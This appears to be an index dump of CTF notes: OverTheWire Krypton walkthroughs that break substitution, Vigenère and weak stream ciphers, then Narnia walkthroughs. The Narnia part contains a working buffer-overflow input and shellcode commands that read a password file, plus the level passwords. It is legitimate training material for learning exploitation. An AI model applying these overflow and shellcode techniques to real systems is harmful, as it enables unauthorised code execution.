lucky. You have intercepted more than one message. The password to the next level is found in the file \u2018krypton4\u2019. You have also found 3 other files. (found1, found2, found3)</p> <p>You know the following important details:</p> <ul> <li>The message plaintexts are in English ( very important) - They were produced from the same key ( even better!)</li> </ul> <p>Enjoy.</p> <ul> <li>Hint<ul> <li>Some letters are more prevalent in English than others.</li> <li>\"Frequency Analysis\" is your friend.</li> </ul> </li> </ul>"},{"location":"CTFs/over-the-wire/krypton/#solution_3","title":"Solution","text":"<p>After logging into krypton4, <pre><code>krypton3@krypton:/krypton/krypton3$ strings found1\nCGZNL YJBEN QYDLQ ZQSUQ NZCYD SNQVU BFGBK GQUQZ QSUQN UZCYD SNJDS UDCXJ ZCYDS NZQSU QNUZB WSBNZ QSUQN UDCXJ CUBGS BXJDS UCTYV SUJQG WTBUJ KCWSV LFGBK GSGZN LYJCB GJSZD GCHMS UCJCU QJLYS BXUMA UJCJM JCBGZ CYDSN CGKDC ZDSQZ DVSJJ SNCGJ DSYVQ CGJSO JCUNS YVQZS WALQV SJJSN UBTSX COSWG MTASN BXYBU CJCBG UWBKG JDSQV YDQAS JXBNS OQTYV SKCJD QUDCX JBXQK BMVWA SNSYV QZSWA LWAKB MVWAS ZBTSS QGWUB BGJDS TSJDB WCUGQ TSWQX JSNRM VCMUZ QSUQN KDBMU SWCJJ BZBTT MGCZQ JSKCJ DDCUE SGSNQ VUJDS SGZNL YJCBG UJSYY SNXBN TSWAL QZQSU QNZCY DSNCU BXJSG CGZBN YBNQJ SWQUY QNJBX TBNSZ BTYVS OUZDS TSUUM ZDQUJ DSICE SGNSZ CYDSN QGWUJ CVVDQ UTBWS NGQYY VCZQJ CBGCG JDSNB JULUJ STQUK CJDQV VUCGE VSQVY DQASJ UMAUJ CJMJC BGZCY DSNUJ DSZQS UQNZC YDSNC USQUC VLANB FSGQG WCGYN QZJCZ SBXXS NUSUU SGJCQ VVLGB ZBTTM GCZQJ CBGUS ZMNCJ LUDQF SUYSQ NSYNB WMZSW TBUJB XDCUF GBKGK BNFAS JKSSG QGWDC USQNV LYVQL UKSNS TQCGV LZBTS WCSUQ GWDCU JBNCS UESGN SUDSN QCUSW JBJDS YSQFB XUBYD CUJCZ QJCBG QGWQN JCUJN LALJD SSGWB XJDSU COJSS GJDZS GJMNL GSOJD SKNBJ STQCG VLJNQ ESWCS UMGJC VQABM JCGZV MWCGE DQTVS JFCGE VSQNQ GWTQZ ASJDZ BGUCW SNSWU BTSBX JDSXC GSUJS OQTYV SUCGJ DSSGE VCUDV QGEMQ ESCGD CUVQU JYDQU SDSKN BJSJN QECZB TSWCS UQVUB FGBKG QUNBT QGZSU QGWZB VVQAB NQJSW KCJDB JDSNY VQLKN CEDJU TQGLB XDCUY VQLUK SNSYM AVCUD SWCGS WCJCB GUBXI QNLCG EHMQV CJLQG WQZZM NQZLW MNCGE DCUVC XSJCT SQGWC GJKBB XDCUX BNTSN JDSQJ NCZQV ZBVVS QEMSU YMAVC UDSWJ DSXCN UJXBV CBQZB VVSZJ SWSWC JCBGB XDCUW NQTQJ CZKBN FUJDQ JCGZV MWSWQ VVAMJ JKBBX JDSYV QLUGB KNSZB EGCUS WQUUD QFSUY SQNSU\nkrypton3@krypton:/krypton/krypton3$ strings found2\nQVJDB MEDGB QJJSG WQGZS NSZBN WUXBN JDSYS NCBWU MNICI STBUJ ACBEN QYDSN UQENS SJDQJ UDQFS UYSQN SKQUS WMZQJ SWQJJ DSFCG EUGSK UZDBB VCGUJ NQJXB NWQXN SSUZD BBVZD QNJSN SWCGQ ABMJQ HMQNJ SNBXQ TCVSX NBTDC UDBTS ENQTT QNUZD BBVUI QNCSW CGHMQ VCJLW MNCGE JDSSV CPQAS JDQGS NQAMJ JDSZM NNCZM VMTKQ UWCZJ QJSWA LVQKJ DNBME DBMJS GEVQG WQGWJ DSUZD BBVKB MVWDQ ISYNB ICWSW QGCGJ SGUCI SSWMZ QJCBG CGVQJ CGENQ TTQNQ GWJDS ZVQUU CZUQJ JDSQE SBXUD QFSUY SQNST QNNCS WJDSL SQNBV WQGGS DQJDQ KQLJD SZBGU CUJBN LZBMN JBXJD SWCBZ SUSBX KBNZS UJSNC UUMSW QTQNN CQESV CZSGZ SBGGB ISTAS NJKBB XDQJD QKQLU GSCED ABMNU YBUJS WABGW UJDSG SOJWQ LQUUM NSJLJ DQJJD SNSKS NSGBC TYSWC TSGJU JBJDS TQNNC QESJD SZBMY VSTQL DQISQ NNQGE SWJDS ZSNST BGLCG UBTSD QUJSU CGZSJ DSKBN ZSUJS NZDQG ZSVVB NQVVB KSWJD STQNN CQESA QGGUJ BASNS QWBGZ SCGUJ SQWBX JDSMU MQVJD NSSJC TSUQG GSUYN SEGQG ZLZBM VWDQI SASSG JDSNS QUBGX BNJDC UUCOT BGJDU QXJSN JDSTQ NNCQE SUDSE QISAC NJDJB QWQME DJSNU MUQGG QKDBK QUAQY JCUSW BGTQL JKCGU UBGDQ TGSJQ GWWQM EDJSN RMWCJ DXBVV BKSWQ VTBUJ JKBLS QNUVQ JSNQG WKSNS AQYJC USWBG XSANM QNLDQ TGSJW CSWBX MGFGB KGZQM USUQJ JDSQE SBXQG WKQUA MNCSW BGQME MUJQX JSNJD SACNJ DBXJD SJKCG UJDSN SQNSX SKDCU JBNCZ QVJNQ ZSUBX UDQFS UYSQN SMGJC VDSCU TSGJC BGSWQ UYQNJ BXJDS VBGWB GJDSQ JNSUZ SGSCG ASZQM USBXJ DCUEQ YUZDB VQNUN SXSNJ BJDSL SQNUA SJKSS GQGWQ UUDQF SUYSQ NSUVB UJLSQ NUACB ENQYD SNUQJ JSTYJ CGEJB QZZBM GJXBN JDCUY SNCBW DQISN SYBNJ SWTQG LQYBZ NLYDQ VUJBN CSUGC ZDBVQ UNBKS UDQFS UYSQN SUXCN UJACB ENQYD SNNSZ BMGJS WQUJN QJXBN WVSES GWJDQ JUDQF SUYSQ NSXVS WJDSJ BKGXB NVBGW BGJBS UZQYS YNBUS ZMJCB GXBNW SSNYB QZDCG EQGBJ DSNSC EDJSS GJDZS GJMNL UJBNL DQUUD QFSUY SQNSU JQNJC GEDCU JDSQJ NCZQV ZQNSS NTCGW CGEJD SDBNU SUBXJ DSQJN SYQJN BGUCG VBGWB GRBDG QMANS LNSYB NJSWJ DQJUD QFSUY SQNSD QWASS GQZBM GJNLU ZDBBV TQUJS NUBTS JKSGJ CSJDZ SGJMN LUZDB VQNUD QISUM EESUJ SWJDQ JUDQF SUYSQ NSTQL DQISA SSGST YVBLS WQUQU ZDBBV TQUJS NALQV SOQGW SNDBE DJBGB XVQGZ QUDCN SQZQJ DBVCZ VQGWB KGSNK DBGQT SWQZS NJQCG KCVVC QTUDQ FSUDQ XJSCG DCUKC VVGBS ICWSG ZSUMA UJQGJ CQJSU UMZDU JBNCS UBJDS NJDQG DSQNU QLZBV VSZJS WQXJS NDCUW SQJD\nkrypton3@krypton:/krypton/krypton3$ strings found3\nDSNSM YBGVS ENQGW QNBUS KCJDQ ENQIS QGWUJ QJSVL QCNQG WANBM EDJTS JDSAS SJVSX NBTQE VQUUZ QUSCG KDCZD CJKQU SGZVB USWCJ KQUQA SQMJC XMVUZ QNQAQ SMUQG WQJJD QJJCT SMGFG BKGJB GQJMN QVCUJ UBXZB MNUSQ ENSQJ YNCPS CGQUZ CSGJC XCZYB CGJBX ICSKJ DSNSK SNSJK BNBMG WAVQZ FUYBJ UGSQN BGSSO JNSTC JLBXJ DSAQZ FQGWQ VBGEB GSGSQ NJDSB JDSNJ DSUZQ VSUKS NSSOZ SSWCG EVLDQ NWQGW EVBUU LKCJD QVVJD SQYYS QNQGZ SBXAM NGCUD SWEBV WJDSK SCEDJ BXJDS CGUSZ JKQUI SNLNS TQNFQ AVSQG WJQFC GEQVV JDCGE UCGJB ZBGUC WSNQJ CBGCZ BMVWD QNWVL AVQTS RMYCJ SNXBN DCUBY CGCBG NSUYS ZJCGE CJ\n</code></pre> substitution cipher solver</p> <p><code>abcdefghijklmnopqrstuvwxyz</code> \u00a0 \u00a0 This clear text  <code>qazwsxedcrfvtgbyhnujmikolp</code> \u00a0 maps to this cipher text </p> <pre><code>krypton3@krypton:/krypton/krypton3$ strings krypton4 | tr \"QAZWSXEDCRFVTGBYHNUJMIKOLP\" \"a-z\"\nwelld oneth eleve lfour passw ordis brute\n</code></pre>"},{"location":"CTFs/over-the-wire/krypton/#password_3","title":"Password","text":"<p>BRUTE</p>"},{"location":"CTFs/over-the-wire/krypton/#level-4-level-5","title":"level 4 \u2192 level 5","text":"<p>Good job!</p> <p>You more than likely used some form of FA and some common sense to solve that one.</p> <p>So far we have worked with simple substitution ciphers. They have also been \u2018monoalphabetic\u2019, meaning using a fixed key, and giving a one to one mapping of plaintext (P) to ciphertext (C). Another type of substitution cipher is referred to as \u2018polyalphabetic\u2019, where one character of P may map to many, or all, possible ciphertext characters.</p> <p>An example of a polyalphabetic cipher is called a Vigen\u00e8re Cipher. It works like this:</p> <p>If we use the key(K) \u2018GOLD\u2019, and P = PROCEED MEETING AS AGREED, then \u201cadd\u201d P to K, we get C. When adding, if we exceed 25, then we roll to 0 (modulo 26).</p> <pre><code>P P R O C E E D M E E T I N G A S A G R E E D\\\nK G O L D G O L D G O L D G O L D G O L D G O\\\n</code></pre> <p>becomes:</p> <pre><code>P 15 17 14 2 4 4 3 12 4 4 19 8 13 6 0 18 0 6 17 4 4 3\\\nK 6 14 11 3 6 14 11 3 6 14 11 3 6 14 11 3 6 14 11 3 6 14\\\nC 21 5 25 5 10 18 14 15 10 18 4 11 19 20 11 21 6 20 2 8 10 17\\\n</code></pre> <p>So, we get a ciphertext of:</p> <pre><code>VFZFK SOPKS ELTUL VGUCH KR\n</code></pre> <p>This level is a Vigen\u00e8re Cipher. You have intercepted two longer, english language messages. You also have a key piece of information. You know the key length!</p> <p>For this exercise, the key length is 6. The password to level five is in the usual place, encrypted with the 6 letter key.</p> <p>Have fun!</p>"},{"location":"CTFs/over-the-wire/krypton/#solution_4","title":"Solution","text":"<p>After logging into krypton5, <pre><code>krypton4@krypton:/krypton/krypton4$ strings found1\nnkrypton4@krypton:/krypton/krypton4$ strings found2\nnkrypton4@krypton:/krypton/krypton4$ strings HINT\nFrequency analysis will still work, but you need to analyse it\nby \"keylength\".  Analysis of cipher text at position 1, 6, 12, etc\nshould reveal the 1st letter of the key, in this case.  Treat this as\n6 different mono-alphabetic ciphers...\nPersistence and some good guesses are the key!\nkrypton4@krypton:/krypton/krypton4$ strings krypton5\nHCIKV RJOX\n</code></pre> - Vigenere solver     - https://www.boxentriq.com/code-breaking/vigenere-cipher     - https://www.dcode.fr/vigenere-cipher</p> <p>key : <code>frekey</code> </p>"},{"location":"CTFs/over-the-wire/krypton/#password_4","title":"Password","text":"<p>CLEARTEXT</p>"},{"location":"CTFs/over-the-wire/krypton/#level-5-level-6","title":"level 5 \u2192 level 6","text":"<p>FA can break a known key length as well. Lets try one last polyalphabetic cipher, but this time the key length is unknown.</p> <p>Enjoy.</p>"},{"location":"CTFs/over-the-wire/krypton/#solution_5","title":"Solution","text":"<p>After logging into krypton3, <pre><code>krypton5@krypton:~$ cd /krypton/krypton5\nkrypton5@krypton:/krypton/krypton5$ ls\nfound1  found2  found3  krypton6  README\nkrypton5@krypton:/krypton/krypton5$ strings found1\nSXULW GNXIO WRZJG OFLCM RHEFZ ALGSP DXBLM PWIQT XJGLA RIYRI BLPPC HMXMG CTZDL CLKRU YMYSJ TWUTX ZCMRH EFZAL OTMNL BLULV MCQMG CTZDL CPTBI AVPML NVRJN SSXWT XJGLA RIQPE FUGVP PGRLG OMDKW RSIFK TZYRM QHNXD UOWQT XJGLA RIQAV VTZVP LMAIV ZPHCX FPAVT MLBSD OIFVT PBACS EQKOL BCRSM AMULP SPPYF CXOKH LZXUO GNLID ZVRAL DOACC INREN YMLRH VXXJD XMSIN BXUGI UPVRG ESQSG YKQOK LMXRS IBZAL BAYJM AYAVB XRSIC KKPYH ULWFU YHBPG VIGNX WBIQP RGVXY SSBEL NZLVW IMQMG YGVSW GPWGG NARSP TXVKL PXWGD XRJHU SXQMI VTZYO GCTZR JYVBK MZHBX YVBIT TPVTM OOWSA IERTA SZCOI TXXLY JAZQC GKPCS LZRYE MOOVC HIEKT RSREH MGNTS KVEPN NCTUN EOFIR TPPDL YAPNO GMKGC ZRGNX ARVMY IBLXU QPYYH GNXYO ACCIN QBUQA GELNR TYQIH LANTW HAYCP RJOMO KJYTV SGVLY RRSIG NKVXI MQJEG GJOML MSGNV VERRC MRYBA GEQNP RGKLB XFLRP XRZDE JESGN XSYVB DSSZA LCXYE ICXXZ OVTPW BLEVK ZCDEA JYPCL CDXUG MARML RWVTZ LXIPL PJKKL CIREP RJYVB ITPVV ZPHCX FPCRG KVPSS CPBXW VXIRS SHYTU NWCGI ANNUN VCOEA JLLFI LECSO OLCTG CMGAT SBITP PNZBV XWUPV RIHUM IBPHG UXUQP YYHNZ MOKXD LZBAK LNTCC MBJTZ KXRSM FSKZC SSELP UMARE BCIPK GAVCY EXNOG LNLCC JVBXH XHRHI AZBLD LZWIF YXKLM PELQG RVPAF ZQNVK VZLCE MPVKP FERPM AZALV MDPKH GKKCL YOLRX TSNIB ELRYN IVMKP ECVXH BELNI OETUX SSYGV TZARE RLVEG GNOQC YXFCX YOQYO ISUKA RIQHE YRHDS REFTB LEVXH MYEAJ PLCXK TRFZX YOZCY XUKVV MOJLR RMAVC XFLHO KXUVE GOSAR RHBSS YHQUS LXSDJ INXLH PXCCV NVIPX KMFXV ZLTOW QLKRY TZDLC DTVXB ACSDE LVYOL BCWPE ERTZD TYDXF AILBR YEYEG ESIHC QMPOX UDMLZ VVMBU KPGEC EGIWO HMFXG NXPBW KPVRS XZCEE PWVTM OOIYC XURRV BHCCS SKOLX XQSEQ RTAOP WNSZK MVDLC PRTRB ZRGPZ AAGGK ZIMAP RLKVW EAZRT XXZCS DMVVZ BZRWS MNRIM ZSRYX IEOVH GLGNL FZKHX KCESE KEHDI FLZRV KVFIB XSEKB TZSPE EAZMV DLCSY ZGGYK GCELN TTUIG MXQHT BJKXG ZRFEX ABIAP MIKWA RVMFK UGGFY JRSIP NBJUI LDSSZ ALMSA VPNTX IBSMO\nkrypton5@krypton:/krypton/krypton5$ strings found2\nGLCYX UKFHS PEZXF AVJOW QQYYR RAYHM GIEOG ARIAZ YEYXV PXFPJ BXXUY SLELR NXHNH PLARX TADLC CSLGE NOSPR IUUML VSNPR RJMOO GMLGU JHVBE QSMFI NZDSK HEFNX KSHGE AVZAZ YQCQP BAKPC LMQGR XXTYR WQSEG FHSPH ZYETX FPVMX PBTWV XMLHM AZXYG EQLRN IAPOZ CXIAZ MVMSL RVNZN SKXCL RNJOL XXSCS HYMYK ZCWPR XNWYR ZJXUG MASQC ELRXX DKWMY PLUGL KHTPR GAKVE WRCEI KESOV JPJGH XJYRE CEGAE HDIBQ SEZAL DAMZX UKKZR EBMIR TLLDH MHRNZ MOOMP CIFVX JDMTP VBGWZ SHCOI FZBUK XGZRF ZALWM JOIJE BUCMB PSSZA LMSYN LJOMO SXQOE ZVTUN HGCXL YMYKA GEWQO LHQIC LFYKL TOPJL RQOMZ YFQNY EOMFG EQCEG NXYVM IPEYG KNOVB ZKXKG UOPKC PBXKF DLCAE FYXUQ IPDLN QBUQL GXWRR YVEXM QMGOG JREGY WBLLA BEULX NTZSO SDDLN MZFGV YATRX YSKTN TRTNT AKRBX YQJRS OKQHE FXTAR IPWMX KTSKV EPVFU KAYJB ZKGNX YOAGW POKTW KGIPX GUVHV EGDXB SHYBS UOVNC XYIIQ DMEOY ARIUP EGNXY RSJOW NTWAR IUTRQ YXACX MWIEG USOJY TVGNX ASHCH MYRLL BZCAV RZMFX MAPPL GMHLS SEXJU BUDLC LJGKK UYSLD MEHXK CMPTW UGESX SRRSG UULNX GWPAO ZODFS EMJGG AKFCO VBUFH XHYME EHXYK RBELR TUYOE IQEFZ LPBCC DWVXM OKXUL CFOKP PCMFT YKTZO WFZAP UGJYV BRIAZ ELWEL DZNRB ZOELO LBZPH DIPES PUGJY VBAYY RHMPK CYXYK FHXWZ ZSGYB UMSLN SEJRV EAGWP SOGKK JGYIF KTJYE JQMEK LPBJC EGUHT YLIPE SPUGJ YVBDX VXTIY YRELR XXUYA DZVPU GJYVB ELRIH UMSPO FRJVO KQZPV OKBUQ EJHEL YTZCM EYIQZ HHZEQ DIAMX YLCRS IZGBS KRBAE FYXUQ IPDFL ZALWE GWFRO GNKPU LCFNX HFMJJ AEGIW OHSAJ EUFOO EBESS UHADL CCSBS AHNXF PSQJB UDIPP WGLHY DLCPW GGUSS WFXIA ZHMDL CCSLG ENOSP RIGNT AKPRS SHMAI EXMYI XOGKY JKLRJ GLZOI LESTU BUDSG EEYRD PXHQL RQBTY SIRTI FUYTO RALQR UNAYJ GEGBT LLAYC YXYET UYXFP VQXTD OVYYH GCHWY VRPVF GGKCI TPVNR FHSHQ LRQZA LVELO PNJRD OVCLP YRHPD IPTRT HRHMG GOIAZ TAFEP TSHYI VSRRD SSZAL BSYOF RZPLO RRSIP UGJYV BLRQZ ALMSD QIRXH VWAFP RNMXU DPCXE AUYZS BRJJB XFHVP WOVRY LLNML LFEUP UCYGE SSIEV DLCDT EKMAI ACWPJ UKULY RGIEE PLVPI PTGCB ARPYC KRYJB KVCNY SLLHX HJLVT KYSKT QESGN XWYGI PXFVT ZCIBL PBTZV XLGDA NEMVR MQMVR GDMKW R\nkrypton5@krypton:/krypton/krypton5$ strings found3\nnkrypton5@krypton:/krypton/krypton5$ strings krypton6\nBELOS Z\n</code></pre> - Vigenere solver     - https://www.boxentriq.com/code-breaking/vigenere-cipher     - https://www.dcode.fr/vigenere-cipher</p> <p>key : <code>keylength</code> </p>"},{"location":"CTFs/over-the-wire/krypton/#password_5","title":"Password","text":"<p>RANDOM</p>"},{"location":"CTFs/over-the-wire/krypton/#level-6-level-7","title":"level 6 \u2192 level 7","text":"<p>Hopefully by now its obvious that encryption using repeating keys is a bad idea. Frequency analysis can destroy repeating/fixed key substitution crypto.</p> <p>A feature of good crypto is random ciphertext. A good cipher must not reveal any clues about the plaintext. Since natural language plaintext (in this case, English) contains patterns, it is left up to the encryption key or the encryption algorithm to add the \u2018randomness\u2019.</p> <p>Modern ciphers are similar to older plain substitution ciphers, but improve the \u2018random\u2019 nature of the key.</p> <p>An example of an older cipher using a complex, random, large key is a vigniere using a key of the same size of the plaintext. For example, imagine you and your confident have agreed on a key using the book \u2018A Tale of Two Cities\u2019 as your key, in 256 byte blocks.</p> <p>The cipher works as such:</p> <p>Each plaintext message is broken into 256 byte blocks. For each block of plaintext, a corresponding 256 byte block from the book is used as the key, starting from the first chapter, and progressing. No part of the book is ever re-used as key. The use of a key of the same length as the plaintext, and only using it once is called a \u201cOne Time Pad\u201d.</p> <p>Look in the krypton6 directory. You will find a file called \u2018plain1\u2019, a 256 byte block. You will also see a file \u2018key1\u2019, the first 256 bytes of \u2018A Tale of Two Cities\u2019. The file \u2018cipher1\u2019 is the cipher text of plain1. As you can see (and try) it is very difficult to break the cipher without the key knowledge.</p> <p>If the encryption is truly random letters, and only used once, then it is impossible to break. A truly random \u201cOne Time Pad\u201d key cannot be broken. Consider intercepting a ciphertext message of 1000 bytes. One could brute force for the key, but due to the random key nature, you would produce every single valid 1000 letter plaintext as well. Who is to know which is the real plaintext?!?</p> <p>Choosing keys that are the same size as the plaintext is impractical. Therefore, other methods must be used to obscure ciphertext against frequency analysis in a simple substitution cipher. The impracticality of an \u2018infinite\u2019 key means that the randomness, or entropy, of the encryption is introduced via the method.</p> <p>We have seen the method of \u2018substitution\u2019. Even in modern crypto, substitution is a valid technique. Another technique is \u2018transposition\u2019, or swapping of bytes.</p> <p>Modern ciphers break into two types; symmetric and asymmetric.</p> <p>Symmetric ciphers come in two flavours: block and stream.</p> <p>Until now, we have been playing with classical ciphers, approximating \u2018block\u2019 ciphers. A block cipher is done in fixed size blocks (suprise!). For example, in the previous paragraphs we discussed breaking text and keys into 256 byte blocks, and working on those blocks. Block ciphers use a fixed key to perform substituion and transposition ciphers on each block discretely.</p> <p>Its time to employ a stream cipher. A stream cipher attempts to create an on-the-fly \u2018random\u2019 keystream to encrypt the incoming plaintext one byte at a time. Typically, the \u2018random\u2019 key byte is xor\u2019d with the plaintext to produce the ciphertext. If the random keystream can be replicated at the recieving end, then a further xor will produce the plaintext once again.</p> <p>From this example forward, we will be working with bytes, not ASCII text, so a hex editor/dumper like hexdump is a necessity. Now is the right time to start to learn to use tools like cryptool.</p> <p>In this example, the keyfile is in your directory, however it is not readable by you. The binary \u2018encrypt6\u2019 is also available. It will read the keyfile and encrypt any message you desire, using the key AND a \u2018random\u2019 number. You get to perform a \u2018known ciphertext\u2019 attack by introducing plaintext of your choice. The challenge here is not simple, but the \u2018random\u2019 number generator is weak.</p> <p>As stated, it is now that we suggest you begin to use public tools, like cryptool, to help in your analysis. You will most likely need a hint to get going. See \u2018HINT1\u2019 if you need a kicktstart.</p> <p>If you have further difficulty, there is a hint in \u2018HINT2\u2019.</p> <p>The password for level 7 (krypton7) is encrypted with \u2018encrypt6\u2019.</p> <p>Good Luck!</p>"},{"location":"CTFs/over-the-wire/krypton/#solution_6","title":"Solution","text":"<p>After logging into krypton6, <pre><code>krypton6@krypton:~$ cd /krypton/krypton6\nkrypton6@krypton:/krypton/krypton6$ ls\nencrypt6  HINT1  HINT2  keyfile.dat  krypton7  onetime  README\nkrypton6@krypton:/krypton/krypton6$ strings krypton7\nPNUKLYLWRQKGKBE\n</code></pre> make temporary directory and prepare <pre><code>krypton6@krypton:/krypton/krypton6$ mktemp -d\n/tmp/tmp.pALYM9kqn7\nkrypton6@krypton:/krypton/krypton6$ cd /tmp/tmp.pALYM9kqn7\nkrypton6@krypton:/tmp/tmp.pALYM9kqn7$ ln -s /krypton/krypton6/keyfile.dat\nkrypton6@krypton:/tmp/tmp.pALYM9kqn7$ ls\nkeyfile.dat\nkrypton6@krypton:/tmp/tmp.pALYM9kqn7$ chmod 777 .\nkrypton6@krypton:/tmp/tmp.pALYM9kqn7$ file /krypton/krypton6/encrypt6\n/krypton/krypton6/encrypt6: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=36c96ef54e4786c48f84343d72fdc35cf85425e5, not stripped\nkrypton6@krypton:/tmp/tmp.pALYM9kqn7$ file /krypton/krypton6/encrypt6\nkrypton6@krypton:/tmp/tmp.pALYM9kqn7$ /krypton/krypton6/encrypt6 /etc/issue\nusage: encrypt6 foo bar\nWhere: foo is the file containing the plaintext and bar is the destination ciphertext file.\nkrypton6@krypton:/tmp/tmp.pALYM9kqn7$ echo {a..z} &gt; az.txt\nkrypton6@krypton:/tmp/tmp.pALYM9kqn7$ ls\n1.txt  az.txt  keyfile.dat\nkrypton6@krypton:/tmp/tmp.pALYM9kqn7$ vim az.txt\nkrypton6@krypton:/tmp/tmp.pALYM9kqn7$ /krypton/krypton6/encrypt6 $(pwd)/az.txt /tmp/tmp.pALYM9kqn7/1.txt\nkrypton6@krypton:/tmp/tmp.pALYM9kqn7$ /krypton/krypton6/encrypt6 $(pwd)/az.txt /tmp/tmp.pALYM9kqn7/2.txt\nkrypton6@krypton:/tmp/tmp.pALYM9kqn7$ /krypton/krypton6/encrypt6 $(pwd)/az.txt /tmp/tmp.pALYM9kqn7/3.txt\nkrypton6@krypton:/tmp/tmp.pALYM9kqn7$ ls\n1.txt  2.txt  3.txt  az.txt  keyfile.dat\nkrypton6@krypton:/tmp/tmp.pALYM9kqn7$ diff 1.txt 2.txt\nkrypton6@krypton:/tmp/tmp.pALYM9kqn7$ \n</code></pre> make file with two lines, and each line contains 256 'a'. <pre><code>krypton6@krypton:/tmp/tmp.pALYM9kqn7$ awk -v i=256 'BEGIN { OFS=\"a\"; $i=\"a\"; print }' &gt; a.txt\nkrypton6@krypton:/tmp/tmp.pALYM9kqn7$ vim a.txt\nkrypton6@krypton:/tmp/tmp.pALYM9kqn7$ /krypton/krypton6/encrypt6 $(pwd)/a.txt /tmp/tmp.pALYM9kqn7/cip_a.txt\nkrypton6@krypton:/tmp/tmp.pALYM9kqn7$ strings cip_a.txt\nn</code></pre> Observe that the cipher text repeats every 30 characters.</p> <p><pre><code>import string\n\n\nif __name__ == \"__main__\":\n    az = string.ascii_lowercase[:]\n\n    for ele in az:\n        with open('./az_plain/' + ele + '.txt', 'w') as f:\n            f.write(ele * 30)\n</code></pre> <pre><code>#!/bin/bash\nfor x in {a..z}\ndo\n     echo \"$x\"\n    /krypton/krypton6/encrypt6 $(pwd)/az_plain/${x}.txt $(pwd)/az_cipher/${x}.txt\ndone\n</code></pre></p> <p><pre><code>import string\n\nif __name__ == \"__main__\":\n    az = string.ascii_lowercase[:]\n\n    cip_text = \"PNUKLYLWRQKGKBE\"\n    pass_text = \"\"\n\n    for i in range(len(cip_text)):\n        for ele in az:\n            with open('./az_cipher/' + ele + '.txt', 'r') as f:\n                r = f.readline()\n                if r[i] == cip_text[i]:\n                    pass_text += ele\n                    break\n\n    print(pass_text)\n</code></pre> lfsrisnotrandom</p>"},{"location":"CTFs/over-the-wire/krypton/#password_6","title":"Password","text":"<p>lfsrisnotrandom</p>"},{"location":"CTFs/over-the-wire/narnia/narnia0/","title":"narnia 0 walkthrough","text":""},{"location":"CTFs/over-the-wire/narnia/narnia0/#description","title":"Description","text":"<p>correct variable value via writing to another variable</p>"},{"location":"CTFs/over-the-wire/narnia/narnia0/#progress","title":"Progress","text":"<p>connect <pre><code>$ ssh narnia0@narnia.labs.overthewire.org -p 2226\nnarnia0\n</code></pre> execute <pre><code>$ /narnia/narnia0\nCorrect val's value from 0x41414141 -&gt; 0xdeadbeef!\nHere is your chance: a\nbuf: a\nval: 0x41414141\nWAY OFF!!!!\n</code></pre></p>"},{"location":"CTFs/over-the-wire/narnia/narnia0/#hint","title":"Hint","text":""},{"location":"CTFs/over-the-wire/narnia/narnia0/#solving","title":"Solving","text":"<pre><code>$ { printf 'a%0.s' {1..20} ; printf '\\xef' ; printf '\\xbe' ; printf '\\xad' ; printf '\\xde' ; cat ;} | /narnia/narnia0\n\nCorrect val's value from 0x41414141 -&gt; 0xdeadbeef!\nHere is your chance: buf: aaaaaaaaaaaaaaaaaaaa\uffad?\nval: 0xdeadbeef\n</code></pre>"},{"location":"CTFs/over-the-wire/narnia/narnia0/#techniques","title":"Techniques","text":"<ul> <li>[[buffer overflow]]</li> </ul>"},{"location":"CTFs/over-the-wire/narnia/narnia0/#tools","title":"Tools","text":"<ul> <li>[[gef]]</li> </ul>"},{"location":"CTFs/over-the-wire/narnia/narnia1/","title":"narnia 1 walkthrough","text":""},{"location":"CTFs/over-the-wire/narnia/narnia1/#description","title":"Description","text":"<p>correct variable value via writing to another variable</p> <p>connect <pre><code>$ ssh narnia1@narnia.labs.overthewire.org -p 2226\neaa6AjYMBB\n</code></pre> execute <pre><code>$ /narnia/narnia1\nGive me something to execute at the env-variable EGG\n</code></pre></p>"},{"location":"CTFs/over-the-wire/narnia/narnia1/#hint","title":"Hint","text":""},{"location":"CTFs/over-the-wire/narnia/narnia1/#progress","title":"Progress","text":"<p>Steps 1. set shellcode as the value of env-variable EGG <pre><code>$ export EGG=`shellcraft -f r cat /etc/narnia_pass/narnia2`\n</code></pre> 2. execute it <pre><code>$ /narnia/narnia1\nTrying to execute EGG!\nZzb6MIyceT\nSegmentation fault (core dumped)\n</code></pre></p>"},{"location":"CTFs/over-the-wire/narnia/narnia1/#techniques","title":"Techniques","text":"<ul> <li>[[shellcode]]</li> </ul>"},{"location":"CTFs/over-the-wire/narnia/narnia1/#tools","title":"Tools","text":""},{"location":"CTFs/over-the-wire/narnia/narnia2/","title":"narnia 2 walkthrough","text":""},{"location":"CTFs/over-the-wire/narnia/narnia2/#description","title":"Description","text":"<p>connect <pre><code>$ ssh narnia2@narnia.labs.overthewire.org -p 2226\nZzb6MIyceT\n</code></pre> execute <pre><code>$ /narnia/narnia2\nUsage: /narnia/narnia2 argument\n$ /narnia/narnia2 a\na\n</code></pre></p>"},{"location":"CTFs/over-the-wire/narnia/narnia2/#hint","title":"Hint","text":"<ul> <li>https://mks.tw/2984/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8-%E5%BE%9E%E6%AF%AB%E7%84%A1%E5%9F%BA%E7%A4%8E%E9%96%8B%E5%A7%8B-pwn-shellcode-%E5%AF%A6%E4%BD%9C#%E7%92%B0%E5%A2%83%E5%BB%BA%E7%BD%AE</li> <li>https://tech-blog.cymetrics.io/posts/crystal/pwn-intro-2/</li> <li>https://tech-blog.cymetrics.io/posts/crystal/reverse-01/</li> <li>https://ctf101.org/binary-exploitation/what-is-the-got/</li> </ul>"},{"location":"CTFs/over-the-wire/narnia/narnia2/#progress","title":"Progress","text":"<p>First check the security properties. <pre><code>$ checksec /narnia/narnia2\n[*] '/narnia/narnia2'\n\u00a0 \u00a0 Arch: \u00a0 \u00a0 i386-32-little\n\u00a0 \u00a0 RELRO:\u00a0 \u00a0 No RELRO\n\u00a0 \u00a0 Stack:\u00a0 \u00a0 No canary found\n\u00a0 \u00a0 NX: \u00a0 \u00a0 \u00a0 NX unknown - GNU_STACK missing\n\u00a0 \u00a0 PIE:\u00a0 \u00a0 \u00a0 No PIE (0x8048000)\n\u00a0 \u00a0 Stack:\u00a0 \u00a0 Executable\n\u00a0 \u00a0 RWX:\u00a0 \u00a0 \u00a0 Has RWX segments\n</code></pre> All the security properties are closed. Check the size of shellcode payload. The payload is 63 bytes long. <pre><code>shellcraft -f r cat /etc/narnia_pass/narnia3 | wc\n\u00a0 \u00a0 \u00a0 0 \u00a0 